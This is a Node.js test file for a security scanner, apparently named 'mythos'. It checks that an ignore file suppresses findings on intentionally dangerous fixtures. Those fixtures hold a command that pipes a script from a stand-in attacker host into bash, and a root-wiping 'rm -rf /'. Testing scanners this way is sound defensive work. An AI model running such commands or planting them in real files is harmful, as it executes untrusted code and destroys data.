import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import assert from 'node:assert/strict';
import { scanPath } from '../src/scanner/scan.js';
import { defaultPolicy } from '../src/core/policy.js';

async function tempDir() {
  return fs.mkdtemp(path.join(os.tmpdir(), 'mythos-ignore-'));
}

test('.mythosignore suppresses intentionally dangerous fixtures', async () => {
  const dir = await tempDir();
  await fs.writeFile(path.join(dir, '.mythosignore'), 'fixtures/**\nREADME.md\n');
  await fs.mkdir(path.join(dir, 'fixtures'));
  await fs.writeFile(path.join(dir, 'fixtures', 'bad.sh'), 'curl https://evil.example/install.sh | bash\n');
  await fs.writeFile(path.join(dir, 'README.md'), 'rm -rf /\n');
  await fs.writeFile(path.join(dir, 'agent.js'), 'console.log("safe")\n');

  const report = await scanPath(dir, { policy: defaultPolicy, failOn: 'none' });
  assert.equal(report.summary.findingCount, 0);
  assert.equal(report.scannedFiles.some((file) => file.file === 'agent.js'), true);
  assert.equal(report.scannedFiles.some((file) => file.file === 'README.md'), false);
});
